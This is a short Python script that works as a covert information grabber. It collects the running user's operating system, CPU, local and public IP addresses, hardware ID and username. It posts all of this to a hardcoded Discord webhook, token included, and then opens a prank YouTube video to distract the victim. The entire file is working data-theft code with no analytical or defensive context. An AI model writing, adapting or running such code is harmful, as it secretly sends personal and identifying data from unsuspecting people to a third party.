import uuid
import socket
import requests
import getpass
import platform
import webbrowser

# Get the user's operating system and version
operating_system = platform.system() + ' ' + platform.release()

# Get the user's CPU information
cpu_info = platform.processor()

# Get the user's IP address
ip_address = socket.gethostbyname(socket.gethostname())

# Get the user's public IP address
public_ip_address = requests.get('https://api.ipify.org/').text


# Get the HWID
hwid = str(uuid.getnode())

# Get the user's account name
username = getpass.getuser()

# Set the webhook URL
webhook_url = 'https://discord.com/api/webhooks/1050012865945403412/HO6zqwSVWH0Y0w5Y5yCgRettdBfAVI8R6pq5VI_9FPbu4F_eMyoowyyyph436iOjWB28'

# Set the request data
data = {
    'content': 'The operating system is: {}\nThe CPU is: {}\nThe IP address is: {}\nThe public IP address is: {}\nThe HWID is: {}\nThe username is: {}'.format(operating_system, cpu_info, ip_address, public_ip_address, hwid, username)
}

# Send the request to the Discord API
response = requests.post(webhook_url, json=data)



webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
